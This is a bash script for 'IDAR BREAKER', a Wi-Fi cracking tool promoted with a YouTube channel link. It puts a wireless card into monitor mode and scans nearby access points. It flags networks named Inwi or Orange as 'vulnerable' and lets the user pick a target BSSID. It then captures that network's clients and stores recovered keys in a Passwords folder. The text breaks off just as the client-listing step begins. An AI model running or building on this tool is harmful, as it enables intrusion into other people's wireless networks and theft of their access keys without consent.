#!/bin/bash
# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White
Orange='\e[38;5;208m'   # Orange
STOP="\e[0m"

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Default
DefaultColor='\e[39m'   # Default foreground color

IB_FOLDER="IDAR-BREAKER$(date "+%T" | tr -d ":")"
Temporary="/tmp/${IB_FOLDER}"

####################################################
########Verify the folder of Temporary files########
####################################################
   Ver_Dir=`ls /tmp | grep -E ^${IB_FOLDER}$`
   if [ "$Ver_Dir" != "" ];then
	    rm -rf ${Temporary}
	    mkdir ${Temporary}
   else
	    mkdir ${Temporary}
   fi

RM_IB_FOLDER() {
echo ""
echo ""
echo ""
echo -e "$White [${Green} ok ${White}]$Green IDAR BREAKER $White By${Cyan} SwiRi Dev${White}."
echo ""
echo -e "$White [$BRed*$BGreen-$BBlue*${White}] For more ${BRed}SUBSCRIBE${White} here: ${Cyan}https://www.youtube.com/channel/UCP8mTc1uo4CtuNcsJGL1Peg${Cyan} ${White}."
echo ""
echo -e "$White [${Red} !! ${White}] Remove any temporary file."
rm -rf ${Temporary}
sleep 1
echo ""
exit
}
exit_function() {
echo ""
echo ""
echo ""
echo -e "$White [${Red}!$White] Remove any temporary file ."
rm -rf ${Temporary}
sleep 1
echo ""
if [ "$mon_name" != "" ]
    then
        echo -e "$White [${Red}!${White}]$BRed Stop$White the ${Green}Monitor Mode$White."
        airmon-ng stop $mon_name > /dev/null 2> /dev/null &
        echo ""
else
	echo -e "The Monitor Mode is Disable"
fi
echo -e "$White [+]$Green Greet to : ${Cyan}SwiRi Dev${White} ${White} ."
echo ""
echo -e "$White [$BRed*$BGreen-$BBlue*${White}] For more ${BRed}SUBSCRIBE${White} here: ${Cyan}https://www.youtube.com/channel/UCP8mTc1uo4CtuNcsJGL1Peg${Cyan} ${White}."
echo -e "$DefaultColor"
exit
}

table() {
					max_s1=""
					max_s2=""
					max_sd=""
					if [ "${max_s}" -gt $Nm_s ]
					then
							for (( TS=$((Nm_s+1));TS<=${max_s};TS++))
								do
									max_s2=${max_s2}' '
							done
							for (( TS=1;TS<=${max_s};TS++))
								do
									max_sd=${max_sd}-
							done
					else
							Nu_TS=$((${Nm_s}-${max_s}))
							for (( TS=1;TS<=${Nu_TS};TS++))
								do
									max_s1=${max_s1}' '
							done
							for (( TS=1;TS<=5;TS++))
								do
									max_sd=${max_sd}-
							done
					fi
}

If_Print() {
					if [ "$If_Print_Num" -lt "10" ]
						then
							max_si3=""
							max_cs3=""
                     		for (( TS=${#Interface[$c]};TS<=${max_si};TS++))
                      			do
                       				max_si3=${max_si3}' '
                     		done
                     		for (( TS=$((${#Chipset[$c]}+1));TS<=${max_cs};TS++))
                      			do
                       				max_cs3=${max_cs3}' '
                     		done
                          		echo -e "${Yellow} |${White} 0$c${Yellow} |${White}  ${Interface[$c]}${max_si1}${max_si3}${Yellow} |${White}  ${Chipset[$c]}${max_cs1}${max_cs3}${Yellow} |"
                   else
                        		echo -e "${Yellow} |${White} $c${Yellow} |${White}  ${Interface[$c]}${max_si1}${max_si3}${Yellow} |${White}  ${Chipset[$c]}${max_cs1}${max_cs3}${Yellow} |"
                   fi
}
listInterfaces() {
	unset iface_list
	for iface in $(ls -1 /sys/class/net)
	do
		if [ -f /sys/class/net/${iface}/uevent ]; then
			if $(grep -q DEVTYPE=wlan /sys/class/net/${iface}/uevent)
			then
				iface_list="${iface_list}\n ${iface}"
			fi
		fi
	done
	if [ -x "$(command -v iwconfig 2>&1)" ] && [ -x "$(command -v sort 2>&1)" ]; then
		for iface in $(iwconfig 2> /dev/null | sed 's/^\([a-zA-Z0-9_.]*\) .*/\1/'); do
			iface_list="${iface_list}\n ${iface}"
		done
		iface_list="$(printf "${iface_list}" | sort -bu)"
	fi
}
getChipset() {
	#this needs cleanup, we shouldn't have multiple lines assigning chipset per bus
	#fix this to be one line per bus
	if [ -f /sys/class/net/$iface/device/modalias ]; then
		BUS="$(cut -d ":" -f 1 /sys/class/net/$iface/device/modalias)"
		if [ "$BUS" = "usb" ]; then
			if [ "${LSUSB}" = "1" ]; then
				BUSINFO="$(cut -d ":" -f 2 /sys/class/net/$iface/device/modalias | cut -b 1-10 | sed 's/^.//;s/p/:/')"
				CHIPSET="$(lsusb -d "$BUSINFO" | head -n1 - | cut -f3- -d ":" | sed 's/^....//;s/ Network Connection//g;s/ Wireless Adapter//g;s/^ //')"
			elif [ "${LSUSB}" = "0" ]; then
				printf "Your system doesn't seem to support usb but we found usb hardware, please report this.\n"
				exit 1
			fi
		#yes the below line looks insane, but broadcom appears to define all the internal buses so we have to detect them here
		elif [ "${BUS}" = "pci" -o "${BUS}" = "pcmcia" ] && [ "${LSPCI}" = "1" ]; then
			if [ -f /sys/class/net/$iface/device/vendor ] && [ -f /sys/class/net/$iface/device/device ]; then
				DEVICEID="$(cat /sys/class/net/$iface/device/vendor):$(cat /sys/class/net/$iface/device/device)"
				CHIPSET="$(lspci -d $DEVICEID | cut -f3- -d ":" | sed 's/Wireless LAN Controller //g;s/ Network Connection//g;s/ Wireless Adapter//;s/^ //')"
			else
				BUSINFO="$(printf "$ethtool_output" | grep bus-info | cut -d ":" -f "3-" | sed 's/^ //')"
				CHIPSET="$(lspci | grep "$BUSINFO" | head -n1 - | cut -f3- -d ":" | sed 's/Wireless LAN Controller //g;s/ Network Connection//g;s/ Wireless Adapter//;s/^ //')"
				DEVICEID="$(lspci -nn | grep "$BUSINFO" | grep '[[0-9][0-9][0-9][0-9]:[0-9][0-9][0-9][0-9]' -o)"
			fi
		elif [ "${BUS}" = "sdio" ]; then
			if [ -f /sys/class/net/$iface/device/vendor ] && [ -f /sys/class/net/$iface/device/device ]; then
				DEVICEID="$(cat /sys/class/net/$iface/device/vendor):$(cat /sys/class/net/$iface/device/device)"
			fi
			if [ "${DEVICEID}" = '0x02d0:0x4330' ]; then
				CHIPSET='Broadcom 4330'
			elif [ "${DEVICEID}" = '0x02d0:0x4329' ]; then
				CHIPSET='Broadcom 4329'
			elif [ "${DEVICEID}" = '0x02d0:0x4334' ]; then
				CHIPSET='Broadcom 4334'
			elif [ "${DEVICEID}" = '0x02d0:0xa94c' ]; then
				CHIPSET='Broadcom 43340'
			elif [ "${DEVICEID}" = '0x02d0:0xa94d' ]; then
				CHIPSET='Broadcom 43341'
			elif [ "${DEVICEID}" = '0x02d0:0x4324' ]; then
				CHIPSET='Broadcom 43241'
			elif [ "${DEVICEID}" = '0x02d0:0x4335' ]; then
				CHIPSET='Broadcom 4335/4339'
			elif [ "${DEVICEID}" = '0x02d0:0xa962' ]; then
				CHIPSET='Broadcom 43362'
			elif [ "${DEVICEID}" = '0x02d0:0xa9a6' ]; then
				CHIPSET='Broadcom 43430'
			elif [ "${DEVICEID}" = '0x02d0:0x4345' ]; then
				CHIPSET='Broadcom 43455'
			elif [ "${DEVICEID}" = '0x02d0:0x4354' ]; then
				CHIPSET='Broadcom 4354'
			elif [ "${DEVICEID}" = '0x02d0:0xa887' ]; then
				CHIPSET='Broadcom 43143'
			else
				CHIPSET="unable to detect for sdio $DEVICEID"
			fi
		else
			CHIPSET="Not pci, usb, or sdio"
		fi
	#we don't do a check for usb here but it is obviously only going to work for usb
	elif [ -f /sys/class/net/$iface/device/idVendor ] && [ -f /sys/class/net/$iface/device/idProduct ]; then
		DEVICEID="$(cat /sys/class/net/$iface/device/idVendor):$(cat /sys/class/net/$iface/device/idProduct)"
		if [ "${LSUSB}" = "1" ]; then
			CHIPSET="$(lsusb | grep -i "$DEVICEID" | head -n1 - | cut -f3- -d ":" | sed 's/^....//;s/ Network Connection//g;s/ Wireless Adapter//g;s/^ //')"
		elif [ "${LSUSB}" = "0" ]; then
			CHIPSET="idVendor and idProduct found on non-usb device, please report this."
		fi
	elif [ "${DRIVER}" = "mac80211_hwsim" ]; then
		CHIPSET="Software simulator of 802.11 radio(s) for mac80211"
	elif $(printf "$ethtool_output" | awk '/bus-info/ {print $2}' | grep -q bcma)
	then
		BUS="bcma"

		if [ "${DRIVER}" = "brcmsmac" ] || [ "${DRIVER}" = "brcmfmac" ] || [ "${DRIVER}" = "b43" ]; then
			CHIPSET="Broadcom on bcma bus, information limited"
		else
			CHIPSET="Unrecognized driver \"${DRIVER}\" on bcma bus"
		fi
	else
		CHIPSET="non-mac80211 device? (report this!)"
	fi
}
GET_INTERFACE_CHIPSET() {
							if [ -d /sys/bus/pci ] || [ -d /sys/bus/pci_express ] || [ -d /proc/bus/pci ]; then
					 			if [ ! -x "$(command -v lspci 2>&1)" ]; then
						 			printf "Please install lspci from your distro's package manager.\n"
						 			exit 1
					 			else
						 			LSPCI=1
					 			fi
							else
					 			LSPCI=0
				 			fi
				 			if [ -d /sys/bus/usb ]; then
					 			if [ ! -x "$(command -v lsusb 2>&1)" ]; then
						 			printf "Please install lsusb from your distro's package manager.\n"
						 			exit 1
					 			else
						 			LSUSB=1
					 			fi
				 			else
					 			LSUSB=0
				 			fi
							listInterfaces
							GIC=1
							for iface in $(printf "${iface_list}"); do
								unset ethtool_output DRIVER FROM FIRMWARE STACK MADWIFI MAC80211 BUS BUSADDR BUSINFO DEVICEID CHIPSET EXTENDED PHYDEV ifacet DRIVERt FIELD1 FIELD1t FIELD2 FIELD2t CHIPSETt
								#add a RUNNING check here and up the device if it isn't already
								ethtool_output="$(ethtool -i $iface 2>&1)"
								if [ "$ethtool_output" != "Cannot get driver information: Operation not supported" ]; then
									getChipset ${iface}
									INTERFACE[$GIC]="$iface"
									CHIPSET_VAR[$GIC]="$CHIPSET"
								else
 									printf "\nethtool failed...\n"
									printf "Only mac80211 devices on kernel 2.6.33 or higher are officially supported by airmon-ng.\n"
									exit 1
								fi
								GIC=$((GIC+1))
							done
}
Ver_Mon_WCar_Fun() {
                 echo ""
				 echo "[+] Scanning for wireless devices ..."
                 if [ $VerCar -ge 1 ] && [ "$VerMon" = "" ]
                      then
                      	   GET_INTERFACE_CHIPSET
                           NUM_INT_CHIP=1
                           Count_INT=0
                           max_si=0
                           max_cs=0
                      	   for (( c=1; c<${GIC}; c++))
       						    do
       						    	m[$c]=`iwconfig 2>&1 | grep "${INTERFACE[$c]}" | grep "ESSID" | awk '{print $1}'`
       						    	if [ "${m[$c]}" != "" ]
       						    		then
       						    			Count_INT=$((Count_INT+1))
       						    			Interface[$Count_INT]=${INTERFACE[$c]}
       						    			Chipset[$Count_INT]=${CHIPSET_VAR[$c]}
       						    			NUM_INT_CHIP=$((NUM_INT_CHIP+1))
       						    	fi
                           	        if [ "${#Chipset[$Count_INT]}" -gt "$max_cs" ]
                           	        	then
                           	        		max_cs=${#Chipset[$Count_INT]}
                           	        fi
                           	        if [ "${#Interface[$Count_INT]}" -gt "$max_si" ]
       						    		then
       						    			max_si=${#Interface[$Count_INT]}
       						    	fi
       					   done
       					   NUM_INT_CHIP=$((NUM_INT_CHIP-1))
       					   max_s=${max_cs}
       					   Nm_s=7
       					   table
       					   max_cs1=$max_s1
       					   max_cs2=$max_s2
       					   max_csd=$max_sd
       					   max_s=${max_si}
       					   Nm_s=9
       					   table
       					   max_si1=$max_s1
       					   max_si2=$max_s2
       					   max_sid=$max_sd
						   echo -e "[+] We found$Green ${NUM_INT_CHIP}$White wireless device(s)."
						   echo ""
						   max_si4=""
						   for (( TS=$((${#max_sid}+1));TS<=9;TS++))
						   		do
						   			max_si4=${max_si4}-
						   done
						   echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   echo -e "${Yellow} |${Red} ID${Yellow} |${Cyan}  Interface${max_si2}${Yellow}  |${Green}  Chipset${max_cs2}${Yellow} |"
						   echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   If_Print_Num="$NUM_INT_CHIP"
						   for (( c=1; c<=${Count_INT}; c++))
       						    do
	     						  If_Print
						   done
						   echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   echo ""
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
								 do
								   echo -en "\033[1A\033[2K"
						           echo -e -n "${White}[+] Select$BRed number$White of wireless device to put into$Green monitor mode$White [${Green}1-${NUM_INT_CHIP}$White]:$Green"
						           read number
								   if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									  then
								          if [ $number -ge 1 ] && [ $number -le "$NUM_INT_CHIP" ]; then
									          V_number=1
											  wlan=${Interface[$number]}
						   		          else
									          V_number=0
										  fi
								   else
								              V_number=0
								   fi
						   done
						   Wait_Msg="Enabling monitor mode on$Green $wlan $White."
						   End_Msg="${Green}Mode Monitor$White is enabled ."
						   trap kill_load SIGINT
						   mon_name=`airmon-ng start $wlan | tail -n 3 | grep enabled | cut -c47-`
						   trap - SIGINT SIGQUIT SIGTSTP
                           mode_monitor="active"
                 elif [ "$VerCar" -le 0 ] && [ "$menu" -eq 6 ]
				        then
						    echo "" 
                            sleep 0.5
                            echo -e $White" [${Red}!${White}] Is no wireless device to put into${Green} monitor mode${White} ."
                            echo ""
                            sleep 0.5
                 elif [ $VerCar -le 0 ] && [ "$VerMon" = "" ]
                        then   
						    echo "" 
                            sleep 0.5
                            echo -e $White"     [${Red}!${White}] Wireless Card${Red} Not Found${White} ."
                            sleep 0.5
                 fi
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 if [[ $VerMon != "" ]]; then
				    mon_name=`iwconfig 2>&1 | grep Mode:Monitor | awk '{print $1}'`
                 fi
                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
}
Mode_Monitor_Print_Function() {
									GET_INTERFACE_CHIPSET
									NUM_INT_CHIP=1
									Count_INT=0
                           			max_si=0
                           			max_cs=0
                           			for (( c=1; c<${GIC}; c++))
       						            do
       						            	m[$c]=`iwconfig 2>&1 | grep "${INTERFACE[$c]}" | grep "Mode:Monitor" | awk '{print $1}'`
       						            	if [ "${m[$c]}" != "" ]
       						    				then
       						    					Count_INT=$((Count_INT+1))
       						    					Interface[$Count_INT]=${INTERFACE[$c]}
       						    					Chipset[$Count_INT]=${CHIPSET_VAR[$c]}
       						    					NUM_INT_CHIP=$((NUM_INT_CHIP+1))
       						    			fi
                           	        		if [ "${#Chipset[$Count_INT]}" -gt "$max_cs" ]
                           	        			then
                           	        				max_cs=${#Chipset[$Count_INT]}
                           	        		fi
                           	        		if [ "${#Interface[$Count_INT]}" -gt "$max_si" ]
       						    				then
       						    					max_si=${#Interface[$Count_INT]}
       						    			fi
       						        done
       						        NUM_INT_CHIP=$((NUM_INT_CHIP-1))
       						        max_s=${max_cs}
       					   			Nm_s=7
       					   			table
       					   			max_cs1=$max_s1
       					   			max_cs2=$max_s2
       					   			max_csd=$max_sd
       					   			max_s=${max_si}
       					   			Nm_s=9
       					   			table
       					   			max_si1=$max_s1
       					   			max_si2=$max_s2
       					   			max_sid=$max_sd
								    echo -e "[+] We found$Green ${NUM_INT_CHIP}$White monitor mode."
									echo ""
									max_si4=""
						   			for (( TS=$((${#max_sid}+1));TS<=9;TS++))
						   				do
						   					max_si4=${max_si4}-
						  			done
						            echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   			echo -e "${Yellow} |${Red} ID${Yellow} |${Cyan}  Interface${max_si2}${Yellow}  |${Green}  Chipset${max_cs2}${Yellow} |"
						   			echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   			If_Print_Num="$NUM_INT_CHIP"
						   			for (( c=1; c<=${Count_INT}; c++))
       						    		do
	     						  			If_Print
						   			done
						            echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"

}
Ver_Mon_Fun() {
                           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   if [ $cou_mon -eq 1 ]
						        then
								    mon=`iwconfig 2>&1 | grep Mode:Monitor | awk '{print $1}'`
						   elif [ $cou_mon -gt 1 ]
						        then
								    Mode_Monitor_Print_Function
									echo ""
									echo ""
									V_number=0
									while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -e -n "\r${White}[+] select$Red number$White of interface to use for capturing [${Green}1-${NUM_INT_CHIP}$White]:$Green"
						                      read number
											  if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									             then
											         if [ $number -ge 1 ] && [ $number -le ${NUM_INT_CHIP} ]; then
											             V_number=1
														 mon=${Interface[$number]}
											         else
											             V_number=0
											         fi
											  else
											             V_number=0
											  fi
								    done
						   fi
}
Loading() {
                disown $PID
                Finish=0
                count=0
				echo ""
				echo -en "\033[1A\033[2K"
                while [ "$Finish" == 0 ]
                do
                  Ver_Ins=`ps -A | grep -w $PID`
                  if [ "$Ver_Ins" == "" ]
  	                 then
  	                     echo ""
  	                     echo -en "\033[1A\033[2K"
  	                     echo -ne "$White[${Green} ok ${White}] $End_Msg"
  	                     Finish=1
                  else
  	                     if [ "$count" -eq 1 ]
  	     	                then
  	                            echo -ne "\r$White[${Red}*   ${White}] $Wait_Msg"
  	                     elif [ "$count" -eq 2 ]
  	     	                then
  	     	                    echo -ne "\r$White[${Red} *  ${White}] $Wait_Msg"
  	                     elif [ "$count" -eq 3 ]
  	     	                then
  	     	                    echo -ne "\r$White[${Red}  * ${White}] $Wait_Msg"
  	                     else
  	     	                    echo -ne "\r$White[${Red}   *${White}] $Wait_Msg"
  	     	                    count=0
  	                     fi
                         Finish=0
                         count=$(($count+1))
                         sleep 0.2
                  fi
                done
                echo ""
}
Installation() {
                echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				sleep 2
                dpkg -i $NOPI > /dev/null 2> /dev/null &
                PID="$!"
                disown $PID
                Finish=0
                count=0
				echo ""
				echo -en "\033[1A\033[2K"
                while [ "$Finish" == 0 ]
                do
                  Ver_Ins=`ps -A | grep -w $PID`
                  if [ "$Ver_Ins" == "" ]
  	                 then
  	                     echo ""
  	                     echo -en "\033[1A\033[2K"
  	                     echo -ne "$White [${Green} ok ${White}] Installation of$Green $NOP$White is done ."
  	                     Finish=1
                  else
  	                     if [ "$count" -eq 1 ]
  	     	                then
  	                            echo -ne "\r$White [${Red}*   ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     elif [ "$count" -eq 2 ]
  	     	                then
  	     	                    echo -ne "\r$White [${Red} *  ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     elif [ "$count" -eq 3 ]
  	     	                then
  	     	                    echo -ne "\r$White [${Red}  * ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     else
  	     	                    echo -ne "\r$White [${Red}   *${White}] Please wait until the$Green $NOP$White is installed ."
  	     	                    count=0
  	                     fi
                         Finish=0
                         count=$(($count+1))
                         sleep 0.2
                  fi
                done
                echo ""
}
Ver_Pckg_Tools() {
	             hash airmon-ng 2> /dev/null
                 Aircrack_Suite="$?"
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
                 Tools_Folder=`ls -l | grep -E 'Tools$' | grep -E '^d'`
				 Uname=`uname -m`
				 Exit=0
				 echo ""
				 hash dpkg 2> /dev/null
				 hash_dpkg="$?"
				 if [ $hash_dpkg -eq 0 ]
				      then
				          	if [ "$Aircrack_Suite" -gt 0 ] && [ "$Tools_Folder" != "" ]
					          	then
					          		NOP="Aircrack-ng"
							        if [ $Uname == 'i686' ]
			                   	       then
									       NOPI="aircrack-ng_1.2-0_rc4_i386.deb"
									       cd Tools/32bits
							               Installation
							               cd ../..
							        else
									       NOPI="aircrack-ng_1.2-0_rc4_amd64.deb"
									       cd Tools/64bits
									       Installation
									       cd ../..
					                fi
					          elif [ "$Aircrack_Suite" -gt 0 ]
					          	then
					          		NOP="Aircrack-ng"
					          		echo -ne "\r$white [${Red}wait${White}]${Red} $NOP${White} not found ..."
					                Exit=1
					          	    sleep 1
					          fi
	          	 else
		          	 	if [ "$Aircrack_Suite" -gt 0 ]
				          	then
				          		NOP="Aircrack-ng"
				          		echo -ne "\r$white [${Red}wait${White}]${Red} $NOP${White} not found ..."
				                Exit=1
				          	    sleep 1
			          	fi
				 fi

				 if [ $Exit -eq 1 ]
				 	then
				 	    exit_function
				 fi
}
START_BREAKING () {
					
					Ver_Mon_Fun
					for ((c=0; c<=3; c++))
					     do
					       echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
						   sleep 1
					done
					Ver_Dir=`ls ${Temporary} | grep -E '^capture$'`
					if [ "$Ver_Dir" != "" ];then
					    rm -rf ${Temporary}/capture
						mkdir ${Temporary}/capture
					else
						mkdir ${Temporary}/capture
					fi
					trap - SIGINT SIGQUIT SIGTSTP
					airodump-ng -w ${Temporary}/capture/capture --output-format csv $mon_name
					Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
					HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
					HeTa=`expr $HeTa - 1`
					head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
					tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv

}
SELECT_CAPTURE_CRACK() {
	                       back=0
						   trap exit_function SIGINT
						   while [ "$back" == "0" ]
						   do
						     echo -ne '\033c'
							 echo -e "${White} +${Red}--------------------------------------------------------------------------------------${White}+"
						     echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen Green$White this mean that device is vulnerable.${Red}                       |"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow Yellow$White this mean that device is may be vulnerable or are not.${Red}    |"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BBlue Blue$White this mean that device is already cracked.                   ${Red}|"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$Purple Purple$White this mean that device is not vulnerable.                 ${Red} |"
							 echo -e "${White} +${Red}--------------------------------------------------------------------------------------${White}+"
						     echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
						     echo -e $Orange" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
						     i=0
						     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
								 do
								   length=${#MAC}
		                           PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		                           PRIVACY=${PRIVACY:0:4}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
			                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
										Ver_vun=`echo $MAC | cut -c 1-8`
			                          	if [ "$CLIENT" != "" ]; then
				                             CLIENT="Yes"
										else
								             CLIENT="No"
			                            fi
			                            if [ "$i" -lt "10" ]
			                            	then
			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
			                            else
			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
			                            fi
			                            
									    BLUE_MAC=0
									    if [ $(cat ./Passwords/${MAC}* 2> /dev/null | grep -i 'key' | wc -l 2> /dev/null) -gt 0 ]
											then
											    echo -e -n $BBlue"$MAC\t"
											    BLUE_MAC=1
										elif [[ "$ESSID" =~ ^\ [Ii]nwi || "$ESSID" =~ ^\ [Oo]range ]] && [ $CHANNEL -eq 1 ]
										    then
											    echo -e -n $BGreen"$MAC\t"
										elif [[ "$ESSID" =~ ^\ [Ii]nwi || "$ESSID" =~ ^\ [Oo]range ]] && [ $CHANNEL -ne 1 ]
											then
								    		    echo -e -n $BYellow"$MAC\t"
									    else
								    		    echo -e -n $BPurple"$MAC\t"
										fi
										echo -e -n $BWhite"$CHANNEL\t"
										echo -e -n $BWhite"$PRIVACY\t"
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$CLIENT" == "Yes" ]
										     then
										         echo -e -n $Green"$CLIENT\t"
										     else
											     echo -e -n $Red"$CLIENT\t"
										fi
										echo -e $BWhite"$ESSID\t"
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            PRIVACY[$i]=$PRIVACY
			                            SPEED[$i]=$SPEED
		                            fi
								 done < ${Temporary}/capture/capture-02.csv
						   echo ""
						   echo ""
						   SELECT_TO_CRACK
						   done
						   if [ "$back" == "1" ]
						        then
								    re="yes"
						   elif [ "$back" == "2" ]
						        then
								    re="no"
						   fi
}
SELECT_TO_CRACK() {
			   	trap exit_function SIGINT
				   V_number=0
				   while [ "$V_number" != "1" ]
				        do
						  echo -en "\033[1A\033[2K"
	                      echo -n -e "${White}  [${Red}+${White}]$Blue Select${White} the ${Red}ID${White} of your target from$White [${Green}${d}${White}-${Green}${i}$White]: "
	                      read  N_OB
	                      N_OB=`echo $N_OB | tr "[:upper:]" "[:lower:]"`
						  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
						      then
						         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
						  	        then
						                V_number=1
						         else
						                V_number=0
						         fi
						  else
					        	V_number=0
						  fi
				   done
					MA=0
					echo ""
					ESSID=${ESSID[$N_OB]}
					CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
					BSSID=${BSSID[$N_OB]}
					PRIVACY=${PRIVACY[$N_OB]}
					SPEED=${SPEED[$N_OB]}
					ESSID="$(echo $ESSID)"
					MA="$N_OB"
					CRACKING_PROCESS
}
CRACKING_PROCESS() {
				trap exit_function SIGINT
				Ver_Dir=`ls ./ | grep Passwords 2> /dev/null`
				Ver_KEY=""
				Ver_p=""
				if [ "$Ver_Dir" == "" ];then
					mkdir ./Passwords
				else
						Ver_p=`ls ./Passwords | grep ${BSSID} 2> /dev/null`
				fi
				if [ "$Ver_p" != "" ]
					then
						file_name=`echo "$BSSID" | tr -d ' '`
						Ver_KEY=`cat ./Passwords/${file_name}.txt | grep -i 'Key' | cut -d'"' -f2`
				fi
				if [ "$Ver_p" != "" ] && [ "$Ver_KEY" != "" ]
				then
				    ESSID_AC=`cat ./Passwords/${file_name}.txt | sed -n 1p | cut -c19-`
					BSSID_AC=`cat ./Passwords/${file_name}.txt | sed -n 2p | cut -c20-`
					CHANNEL_AC=`cat ./Passwords/${file_name}.txt | sed -n 3p | cut -c20-`
					Key_AC=`cat ./Passwords/${file_name}.txt | sed -n 4p | awk -F\" '{print $2}'`
					cr_date_AC=`cat ./Passwords/${file_name}.txt | sed -n 5p | cut -c20-`
					echo ""
					echo -e " ${Red} [${Yellow}+${Red}]$BGreen $BSSID$White is already cracked : "
					echo ""
					echo -e "${White}           [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID_AC" 
					echo -e "${White}           [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID_AC"
					echo -e "${White}           [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL_AC"
					echo -e "${White}           [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key_AC${White}\""
					echo -e "${White}           [+]${Yellow} Date       ${Red}>>${White} $cr_date_AC"
					trap exit_function SIGINT
					echo ""
					echo ""
					echo -e "$Yellow       [0]$BWhite Back to list of wireless networks."
					echo -e "$Yellow       [1]$BWhite Back to main menu."
					echo -e "$Yellow       [2]$BRed exit."
					echo ""
					echo ""
					back="3"
					while [ "$back" != "0" ] && [ "$back" != "1" ] && [ "$back" != "2" ] && [ "$back" != "\n" ]
					     do
					   echo -en "\033[1A\033[2K"
					       echo -e -n "$White            [+] Select$BRed one$White thing from the menu :"
					       read back
					done
				else

					echo ""
					echo -e "${White} [${Red}!${White}] Wait until$Green the users $White are listed :"
					echo ""
					for ((c=0; c<=3; c++))
				 	do
					   echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
					   sleep 1
					done
					trap - SIGINT SIGQUIT SIGTSTP
					if [[ ` ls ${Temporary}/capture/ | grep captureClient ` != "" ]]; then
						rm ${Temporary}/capture/captureClient*
					fi
				   	airodump-ng --bssid $BSSID -c $CHANNEL -w ${Temporary}/capture/captureClient --output-format csv $mon_name
				   	echo ""
					LIST_CLIENTS
					if [ "${#Vun_BSSID[@]}" -eq "$MA" ]
					then
						trap exit_function SIGINT
						echo ""
						echo ""
						echo -e "$Yellow       [0]$BWhite Back to list of wireless networks."
						echo -e "$Yellow       [1]$BWhite Back to main menu."
						echo -e "$Yellow       [2]$BRed exit."
						echo ""
						echo ""
						back="3"
						while [ "$back" != "0" ] && [ "$back" != "1" ] && [ "$back" != "2" ] && [ "$back" != "\n" ]
						do
							echo -en "\033[1A\033[2K"
							echo -e -n "$White            [+] Select$BRed one$White thing from the menu :"
							read back
						done
					fi
				fi
			}
LIST_CLIENTS() {
			echo -ne '\033c'
		   	trap exit_function SIGINT
